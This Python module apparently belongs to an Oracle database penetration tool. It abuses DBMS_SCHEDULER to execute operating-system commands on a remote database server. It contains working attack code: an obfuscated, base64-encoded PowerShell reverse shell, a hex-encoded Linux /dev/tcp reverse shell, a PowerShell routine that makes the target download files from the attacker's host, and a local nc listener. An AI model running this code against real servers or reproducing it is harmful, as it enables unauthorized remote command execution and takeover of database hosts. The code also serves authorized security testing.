#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging, cx_Oracle, subprocess
from Utils import ErrorSQLRequest, checkOptionsGivenByTheUser
from Constants import *
from time import sleep
from threading import Thread
import base64
from MinHtppServer import serverFileForOneRequest

class DbmsScheduler (OracleDatabase):
	'''
	Allow the user to execute a command on the remote database system with DBMS_SCHEDULER
	'''

	R_SHELL_COMMAND_POWERSHELL_PAYLOAD = 'function ReverseShellClean {{if ($c.Connected -eq $true) {{$c.Close()}}; if ($p.ExitCode -ne $null) {{$p.Close()}}; exit; }};$a="{0}"; $port="{1}";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName="cmd.exe" ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){{$out += $e.GetString($os.Read())}} $s.Write($e.GetBytes($out),0,$out.Length);$out=$null;$done=$false;while (-not $done) {{if ($c.Connected -ne $true) {{cleanup}} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {{ $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {{break}}}}  if ($pos -gt 0){{ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {{ReverseShellClean}} else {{  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){{ $out += $e.GetString($os.Read());if ($out -eq $string) {{$out=" "}}}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}}}} else {{ReverseShellClean}}}};'  # {0} IP, {1} port
	R_SHELL_COMMAND_POWERSHELL = "powershell.exe -EncodedCommand {0}"  # {0} powershell code base64 encoded
	SIZE_LIMIT_ARG = 1024 # Size max of an argument with set_job_argument_value

	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("DbmSscheduler object created")
		OracleDatabase.__init__(self,args)
		self.jobName = None
		self.CMD_WIND_PATH = "c:\windows\system32\cmd.exe"
		self.PS_X86_PATH = """C:\windows\syswow64\windowspowershell\\v1.0\powershell.exe"""
		self.PS_X64_PATH = """C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe"""

	def __removeJob__(self, jobName, force=False, defer=True):
		'''
		Remove a Job from dbmssceduler
		If force is set to TRUE, the Scheduler first attempts to stop the running job instances (by issuing the
		STOP_JOB call with the force flag set to false), and then drops the jobs.
		If defer is set to TRUE, the Scheduler allows the running jobs to complete and then drops the jobs.
		Setting both force and defer to TRUE results in an error.
		If both force and defer are set to FALSE and a job is running at the time of the call, the attempt
		to drop that job fails.
		Dropping a job requires ALTER privileges on the job either as the owner of the job or as a user with
		the ALTER object privilege on the job or the CREATE ANY JOB system privilege.
		Return True if no error, otherwise return Exception
		'''
		parameters = {'job_name': jobName, 'force': force, 'defer': defer} #'force': force, 'defer': defer
		cursor = cx_Oracle.Cursor(self.args['dbcon'])
		try:
			logging.info("Trying to remove job {0}".format(jobName))
			#cursor.callproc(name="DBMS_SCHEDULER.drop_job", keywordParameters=parameters)
			cursor.execute("begin DBMS_SCHEDULER.drop_job('{0}', {1}, {2}); end;".format(jobName, force, defer))
		except Exception as e:
			logging.info('Error with DBMS_SCHEDULER.drop_job: {0}'.format(self.cleanError(e)))
			return ErrorSQLRequest(e)
		if defer == False:
			logging.info("Job {0} has been removed".format(jobName))
		else:
			logging.info("When job will be completed, the job {0} will be dropped".format(jobName))
		return True

	def __createJob__(self, cmd):
		'''
		Create a job for DBMS_SCHEDULER
		Be Careful: Special chars are not allowed in the command line
		'''
		logging.info('Create a job named {0}'.format(self.jobName))
		splitCmd = cmd.split()
		parameters = {'job_name':self.jobName,'job_type':'EXECUTABLE','job_action':splitCmd[0],'number_of_arguments':len(splitCmd)-1} #'auto_drop':True does not work with CX_Oralce. Why ?
		cursor = cx_Oracle.Cursor(self.args['dbcon'])
		try :
			if self.args['show_sql_requests'] == True: logging.info("SQL request executed: DBMS_SCHEDULER.create_job with these parameters: {0}".format(parameters))
			cursor.callproc(name="DBMS_SCHEDULER.create_job",keywordParameters=parameters)
			#cursor.execute("begin DBMS_SCHEDULER.create_job(:job_name, :job_type, :job_action, :number_of_arguments, :auto_drop); end;", parameters)
		except Exception as e: 
			logging.info('Error with DBMS_SCHEDULER.create_job: {0}'.format(self.cleanError(e)))
			return ErrorSQLRequest(e)
		else :
			for pos,anArg in enumerate(splitCmd):
				if pos!=0:
					parameters = {'job_name':self.jobName,'argument_position':pos,'argument_value':anArg}
					try :
						if self.args['show_sql_requests'] == True: logging.info("SQL request executed: DBMS_SCHEDULER.set_job_argument_value with these parameters: {0}".format(parameters))
						cursor.callproc(name="DBMS_SCHEDULER.set_job_argument_value",keywordParameters=parameters)
					except Exception as e: 
						logging.info('Error with DBMS_SCHEDULER.set_job_argument_value:{0}'.format(self.cleanError(e)))
						return ErrorSQLRequest(e)
		return True

	def __runJob__(self):
		'''
		run the job named self.jobName
		'''
		logging.info('Run the job')
		cursor = cx_Oracle.Cursor(self.args['dbcon'])
		try :
			cursor.callproc(name="DBMS_SCHEDULER.enable",keywordParameters={'name':self.jobName})
		except Exception as e: 
			logging.info('DBMS_SCHEDULER.enable:{0}'.format(self.cleanError(e)))
			return ErrorSQLRequest(e)
		return True

	def __getJobStatus__(self):
		'''
		Get the job status from user_scheduler_job_log table	
		return Exception if error
		return False : the job is not created or job is running
		return Exception: there is an exception
		return string if NOT SUCCESS
		return True if SUCCESS
		'''
		sleep(3)
		query = "SELECT status, additional_info FROM USER_SCHEDULER_JOB_RUN_DETAILS WHERE job_name = '{0}'".format(self.jobName)
		response = self. __execThisQuery__(query=query,ld=['status','additional_info'])
		if isinstance(response,Exception) :
			logging.info('Error with the SQL request {0}: {1}'.format(query,str(response)))
			return ErrorSQLRequest(response)
		if response == [] : 
			self.args['print'].goodNews("The Job is running")
			return False
		elif response[0]['status'] == "FAILED" :
			self.args['print'].badNews("The Job has failed: {0}".format(response[0]['additional_info'])) 
			str(response[0]['additional_info'])
			return False
		else : 
			self.args['print'].goodNews("The Job is finish") 
			return True

	def execOSCommand(self, cmd, prepandWindCmdPath=False):
		'''
		Execute an OS command on the remote database system
		Example: 
		    exec DBMS_SCHEDULER.CREATE_JOB(job_name=>'J1226',job_type=>'EXECUTABLE',number_of_arguments=>3,job_action =>'/bin/ping',auto_drop=>FALSE);
		    exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1226',1,'-c');
		    exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1226',2,'2');
		    exec DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1226',3,'192.168.56.1');
		    exec DBMS_SCHEDULER.ENABLE('J1226');
		    select log_id, log_date, job_name, status, error#, additional_info from dba_scheduler_job_run_details where job_name ='J1226';
		If prepandWindCmdPath is enabled, prepand path to cmd.exe before executing the command.
		'''
		self.jobName = self.__generateRandomString__(nb=20)
		logging.info('Execute the following command on the remote database system: {0}'.format(cmd))
		logging.info('Be Careful: Special chars are not allowed in the command line')
		if ">" in cmd:
			logging.warning('Be Careful: Special chars are not allowed in the command line and it seems you are using one')
		if prepandWindCmdPath == True:
			fullCmd = "{0} /c {1}".format(self.CMD_WIND_PATH, cmd)
		else:
			fullCmd = cmd
		status = self.__createJob__(fullCmd)
		if isinstance(status,Exception): return status
		status = self.__runJob__()
		if isinstance(status,Exception): return status
		return True

	def __runListenNC__ (self,port=None):
		'''
		nc listen on the port
		'''
		try :
			subprocess.call("nc -l -4 -n -v -p {0}".format(port), shell=True)
		except KeyboardInterrupt: pass

	def giveReverseShell(self, localip, localport, httpServerTimeout=15, targetFilename="t.cmd"):
		'''
		Give a reverse tcp shell via nc
		Need upload nc.exe if the remote system is windows
		- httpServerTimeout: time before to close the connection (Windows Only)
		- targetFilename: path to the file on the target (Windows Only)
		'''
		if self.remoteSystemIsWindows() == True :
			CMD_EXEC_FILE = ".\{0}"
			httpPort = None
			CMD = self.getReverseShellPowershellCommand(localip, localport)
			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
			httpPort = int(input("Give me the local port for the temporary http file server {e.g. 8080): "))
			logging.debug("The http server will listen on {0}:{1} during {2} seconds".format(localip, httpPort, httpServerTimeout))
			tHttpServer = Thread(None, serverFileForOneRequest, None, (), {'ip':localip, 'port':httpPort, 'content':CMD.encode('utf-8'), 'timeout':httpServerTimeout})
			tHttpServer.start()
			logging.debug("Http Server started in a new thread")
			urlToDownload = "http://{0}:{1}/{2}".format(localip, httpPort, self.__generateRandomString__(nb=10))
			logging.debug("URL used to make the target download the file {0}: {1}".format(targetFilename, urlToDownload))
			status = self.makeDownloadFile(urlToDownload, targetFilename)
			logging.debug("Starting the local listener in a new thread")
			a = Thread(None, self.__runListenNC__, None, (), {'port': localport})
			a.start()
			try:
				self.execOSCommand(cmd=CMD_EXEC_FILE.format(targetFilename), prepandWindCmdPath=True)
			except KeyboardInterrupt:
				self.args['print'].goodNews("Connection closed")
			status = self.__getJobStatus__()
			self.__removeJob__(self.jobName, force=False, defer=True)
			

			"""
			self.args['print'].goodNews("The powershell reverse shell tries to connect to {0}:{1}".format(localip, localport))
			a = Thread(None, self.__runListenNC__, None, (), {'port': localport})
			a.start()
			try:
				self.execOSCommand(cmd=CMD)
			except KeyboardInterrupt:
				self.args['print'].goodNews("Connection closed")
			self.__getJobStatus__()
			self.__removeJob__(self.jobName, force=False, defer=True)
			"""
		elif self.remoteSystemIsLinux() == True :
			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
			CMD = '''/usr/bin/python -c exec('{0}'.decode('hex'))'''.format(PYTHON_CODE.encode('utf-8').hex())
			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
			self.args['print'].goodNews("The python reverse shell tries to connect to {0}:{1}".format(localip,localport))
			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
			a.start()
			try :
				self.execOSCommand(cmd=CMD)
			except KeyboardInterrupt: 
				self.args['print'].goodNews("Connection closed")
			self.__getJobStatus__()
			self.__removeJob__(self.jobName, force=False, defer=True)
		else :
			logging.error("The remote server OS ({0}) is unknown".format(self.remoteOS.lower()))

	def getReverseShellPowershellCommand(self, localip, localport):
		'''
		Return a powershell reverse shell complete command (obfuscated)
		The powershell command will connect to localip:localport
		A listener is required for getting the reverse shell
		:return: string (to execute)
		'''
		ps_code = self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport).encode('UTF-16LE')
		ps_code_encoded = base64.b64encode(ps_code).decode('utf-8')
		cmdAndPayload = "{0} -EncodedCommand {1}".format(self.PS_X64_PATH, ps_code_encoded)
		#cmdAndPayload = self.R_SHELL_COMMAND_POWERSHELL.format(base64.b64encode("".join([c + '\x00' for c in self.R_SHELL_COMMAND_POWERSHELL_PAYLOAD.format(localip, localport)]).encode('utf-8')))
		return cmdAndPayload

	def makeDownloadFile(self, urlToFile, remoteFilePath):
		'''
		Make the target download local file localFilePath to remoteFilePath
		:param localFile:
		:return: status of the job (True or False if an error)
		'''
		PS_CODE_DOWNLOAD = """$c=new-object System.Net.WebClient;$c.DownloadFile("{0}", "{1}")"""#{0}urlToFile, {1}urlToFile
		ps_code = PS_CODE_DOWNLOAD.format(urlToFile, remoteFilePath).encode('UTF-16LE')
		ps_code_encoded = base64.b64encode(ps_code).decode('utf-8')
		cmdAndPayload = "{0} -EncodedCommand {1}".format(self.PS_X64_PATH, ps_code_encoded)
		self.execOSCommand(cmd=cmdAndPayload)
		status = self.__getJobStatus__()
		self.__removeJob__(self.jobName, force=False, defer=True)
		return status

	def testAll (self):
		'''
		Test all functions
		'''
		command = self.__generateRandomString__()	
		self.args['print'].subtitle("DBMSSCHEDULER library ?")
		logging.info("Try to use the DBMScheduler library to execute the following random command: {0}".format(command))
		status = self.execOSCommand(cmd=command)
		if status == True or self.ERROR_BAD_FOLDER_OR_BAD_SYSTEM_PRIV in str(status):
			self.args['print'].goodNews("OK")
		else : 
			self.args['print'].badNews("KO")
		self.__removeJob__(self.jobName, force=True, defer=False)


def runDbmsSchedulerModule(args):
	'''
	Run the DBMSAdvisor module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module","exec","reverse-shell","make-download"]) == False : return EXIT_MISS_ARGUMENT
	dbmsScheduler = DbmsScheduler(args)
	status = dbmsScheduler.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if the DBMSScheduler library can be used")
		status = dbmsScheduler.testAll()
	#Option 1: exec
	if args['exec'] != None:
		args['print'].title("Execute the `{0}` on the {1} server".format(args['exec'],args['server']))
		status = dbmsScheduler.execOSCommand(args['exec'], prepandWindCmdPath=args['cmd-exe'])
		if status == True:
			args['print'].goodNews("The `{0}` command was executed on the {1} server".format(args['exec'],args['server']))
		else :
			args['print'].badNews("The `{0}` command was not executed on the {1} server: {2}".format(args['exec'],args['server'],str(status)))
		dbmsScheduler.__getJobStatus__()
		dbmsScheduler.__removeJob__(dbmsScheduler.jobName, force=True, defer=False)
	#Option 2: reverse shell
	if args['reverse-shell'] != None :
		args['print'].title("Try to give you a reverse shell from the {0} server".format(args['server']))
		dbmsScheduler.giveReverseShell(localip=args['reverse-shell'][0],localport=args['reverse-shell'][1])
	# Option 2: make target download a local file
	if args['make-download'] != None:
		args['print'].title("Try to make the target {0} download local file {1} with powershell over http, and saved it in {2}".format(args['server'], args['make-download'][0], args['make-download'][1]))
		args['print'].printImportantNotice("You have to serve the file according to your path {0} over a http server. 'python -m SimpleHTTPServer PORT' can be used for example ".format(args['make-download'][0]))
		dbmsScheduler.makeDownloadFile(urlToFile=args['make-download'][0], remoteFilePath=args['make-download'][1])
	dbmsScheduler.close()






